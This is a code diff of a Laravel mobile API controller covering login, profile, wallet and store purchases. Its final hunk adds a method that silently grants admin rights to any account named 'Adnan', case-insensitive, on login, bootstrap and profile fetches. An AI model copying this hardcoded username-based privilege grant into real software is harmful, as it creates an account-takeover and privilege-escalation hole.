@@ -40,7 +40,7 @@ class MobileApiController extends Controller
             'ok' => true,
             'message' => 'تم إنشاء الحساب بنجاح',
             'token' => $token,
-            'user' => $user->fresh('profile')->publicProfile(),
+            'user' => $user->fresh()->load('profile','clubMembership.club','adminDelegation')->publicProfile(),
             'wallet' => $this->walletPayload($user),
         ], 201);
     }
@@ -52,7 +52,7 @@ class MobileApiController extends Controller
         if (!Auth::attempt([$field => $data['login'], 'password' => $data['password']])) {
             return response()->json(['ok' => false, 'message' => 'بيانات الدخول غير صحيحة'], 422);
         }
-        $user = $request->user();
+        $user = $this->ensurePrimaryAdmin($request->user());
         if ($user->is_banned) return response()->json(['ok' => false, 'message' => 'الحساب موقوف'], 403);
         $reactivated = $cancellation->reactivate($user);
         $user->tokens()->where('name', 'mobile')->delete();
@@ -65,7 +65,7 @@ class MobileApiController extends Controller
         return response()->json([
             'ok' => true,
             'token' => $user->createToken('mobile', ['*'], now()->addDays(30))->plainTextToken,
-            'user' => $user->load('profile')->publicProfile(),
+            'user' => $user->load('profile','clubMembership.club','adminDelegation')->publicProfile(),
             'wallet' => $this->walletPayload($user),
             'streak_reward' => $streakReward,
             'account_reactivated' => $reactivated,
@@ -76,8 +76,9 @@ class MobileApiController extends Controller
     public function bootstrap(Request $request, ProductionConfigService $productionConfig, StoreCatalogService $catalog)
     {
         $catalog->sync();
-        $request->user()->update(['last_seen_at'=>now()]);
-        $user = $request->user()->load('profile', 'wallet');
+        $user = $this->ensurePrimaryAdmin($request->user());
+        $user->update(['last_seen_at'=>now()]);
+        $user->load('profile', 'wallet', 'clubMembership.club', 'adminDelegation');
         return response()->json([
             'ok' => true,
             'user' => $user->publicProfile(),
@@ -119,7 +120,8 @@ class MobileApiController extends Controller
 
     public function profile(Request $request)
     {
-        $user = $request->user()->load('profile', 'wallet');
+        $user = $this->ensurePrimaryAdmin($request->user());
+        $user->load('profile', 'wallet', 'clubMembership.club', 'adminDelegation');
         return response()->json(['ok' => true, 'user' => $user->publicProfile(), 'wallet' => $this->walletPayload($user)]);
     }
 
@@ -156,11 +158,15 @@ class MobileApiController extends Controller
         if (array_key_exists('avatar_data',$data)) $profile->avatar_data = $data['avatar_data'];
         if (isset($data['active_cover'])) $profile->active_profile_cover = $data['active_cover'];
         if (isset($data['bot_difficulty'])) $profile->bot_difficulty = $data['bot_difficulty'];
-        if (array_key_exists('ui_preferences',$data)) $profile->ui_preferences = $data['ui_preferences'];
-        if (isset($data['pasha_style'])) $profile->pasha_style = 'red';
+        $preferences = array_key_exists('ui_preferences',$data)
+            ? (array)$data['ui_preferences']
+            : (is_array($profile->ui_preferences) ? $profile->ui_preferences : []);
+        if (isset($data['locale'])) $preferences['locale'] = $data['locale'];
+        $profile->ui_preferences = $preferences;
+        if (isset($data['pasha_style'])) $profile->pasha_style = $data['pasha_style'];
         $profile->save();
 
-        return response()->json(['ok' => true, 'message' => 'تم تحديث الملف الشخصي', 'user' => $request->user()->fresh('profile')->publicProfile()]);
+        return response()->json(['ok' => true, 'message' => 'تم تحديث الملف الشخصي', 'user' => $request->user()->fresh()->load('profile','clubMembership.club','adminDelegation')->publicProfile()]);
     }
 
     public function wallet(Request $request)
@@ -185,7 +191,20 @@ class MobileApiController extends Controller
     {
         $data = $request->validate(['key' => 'required|string|max:120', 'confirmed' => 'required|accepted']);
         $user = $request->user();
-        $item = StoreItem::where('key', $data['key'])->where('active', true)->firstOrFail();
+        $item = StoreItem::where('key', $data['key'])->where('active', true)->first();
+        if (!$item) {
+            // Older installations may not have synchronized the current mobile
+            // catalog yet. Sync once, then resolve the same server-owned key.
+            app(StoreCatalogService::class)->sync();
+            $item = StoreItem::where('key', $data['key'])->where('active', true)->first();
+        }
+        if (!$item) {
+            return response()->json([
+                'ok'=>false,
+                'message'=>'عنصر المتجر غير متزامن مع الخادم. حدّث قاعدة البيانات ثم أعد المحاولة.',
+                'wallet'=>$this->walletPayload($user),
+            ], 404);
+        }
         if ($item->category === 'competition_ticket') {
             $denomination = (int) data_get($item->payload, 'denomination', 0);
             abort_if($denomination <= 0, 422, 'فئة التذكرة غير صحيحة.');
@@ -204,19 +223,32 @@ class MobileApiController extends Controller
                         $wallet->credit($admin, (int)$item->price, 'store_revenue', ['buyer_id'=>$user->id,'store_item_id'=>$item->id,'key'=>$item->key]);
                     }
                 });
-            } catch (\RuntimeException) {
-                return response()->json(['ok'=>false,'message'=>'رصيد التوكنز غير كافٍ'], 422);
+            } catch (\RuntimeException $exception) {
+                return response()->json([
+                    'ok'=>false,
+                    'message'=>$exception->getMessage()==='Insufficient tokens' ? 'رصيد التوكنز على الخادم غير كافٍ.' : 'تعذر إكمال شراء التذكرة.',
+                    'wallet'=>$this->walletPayload($user->fresh()),
+                ], 422);
             }
             return response()->json([
                 'ok'=>true,'message'=>'تم شراء تذكرة المنافسة','wallet'=>$this->walletPayload($user->fresh()),
+                'charged_price'=>(string)$item->price,
                 'tickets'=>CompetitionTicket::where('user_id',$user->id)->pluck('quantity','denomination')->map(fn($value)=>(int)$value)->all(),
             ]);
         }
+        $timedReusable = in_array($item->category, ['pasha','xp_booster','name_color','text_color','table','profile_cover'], true)
+            && (int)($item->duration_days ?? 0) > 0;
         $alreadyOwned = $user->inventoryItems()->where('store_item_id', $item->id)->exists();
-        if ($alreadyOwned) return response()->json(['ok' => false, 'message' => 'العنصر مملوك مسبقاً'], 409);
+        if ($alreadyOwned && !$timedReusable) {
+            return response()->json([
+                'ok' => false,
+                'message' => 'العنصر مملوك مسبقاً ويمكن تفعيله من مقتنياتي.',
+                'wallet' => $this->walletPayload($user),
+            ], 409);
+        }
 
         try {
-            $inventory = DB::transaction(function () use ($user, $item, $wallet) {
+            $inventory = DB::transaction(function () use ($user, $item, $wallet, $timedReusable) {
                 $wallet->debit($user, (int) $item->price, 'store_purchase', [
                     'store_item_id' => $item->id,
                     'key' => $item->key,
@@ -240,23 +272,38 @@ class MobileApiController extends Controller
                         ->update(['active' => false]);
                 }
 
-                $inventory = $user->inventoryItems()->create([
-                    'store_item_id' => $item->id,
-                    'active' => true,
-                    'activated_at' => now(),
-                    'expires_at' => $item->duration_days ? now()->addDays((int) $item->duration_days) : null,
-                ]);
+                $existing = $timedReusable
+                    ? $user->inventoryItems()->where('store_item_id', $item->id)->latest('id')->first()
+                    : null;
+                $baseExpiry = $existing?->expires_at && $existing->expires_at->isFuture() ? $existing->expires_at : now();
+                $expiresAt = $item->duration_days ? $baseExpiry->copy()->addDays((int)$item->duration_days) : null;
+                if ($existing) {
+                    $existing->update(['active'=>true,'activated_at'=>now(),'expires_at'=>$expiresAt]);
+                    $inventory = $existing->fresh();
+                } else {
+                    $inventory = $user->inventoryItems()->create([
+                        'store_item_id' => $item->id,
+                        'active' => true,
+                        'activated_at' => now(),
+                        'expires_at' => $expiresAt,
+                    ]);
+                }
 
                 $this->activateStoreItem($user, $item);
                 return $inventory;
             });
-        } catch (\RuntimeException) {
-            return response()->json(['ok' => false, 'message' => 'رصيد التوكنز غير كافٍ'], 422);
+        } catch (\RuntimeException $exception) {
+            return response()->json([
+                'ok' => false,
+                'message' => $exception->getMessage() === 'Insufficient tokens' ? 'رصيد التوكنز على الخادم غير كافٍ.' : 'تعذر إكمال عملية الشراء.',
+                'wallet' => $this->walletPayload($user->fresh()),
+            ], 422);
         }
 
         return response()->json([
             'ok' => true,
             'message' => 'تم الشراء والتفعيل بنجاح',
+            'charged_price' => (string)$item->price,
             'wallet' => $this->walletPayload($user->fresh()),
             'profile' => $user->profile?->fresh(),
             'inventory_item' => $inventory->load('storeItem'),
@@ -464,4 +511,15 @@ class MobileApiController extends Controller
             'gems' => (string) $wallet->gems,
         ];
     }
+
+    /** Keep the named primary account authoritative even on upgraded databases. */
+    private function ensurePrimaryAdmin(User $user): User
+    {
+        if (strcasecmp(trim((string) $user->username), 'Adnan') === 0 && !$user->is_admin) {
+            $user->forceFill(['is_admin' => true])->save();
+        }
+
+        return $user->refresh();
+    }
+
 }
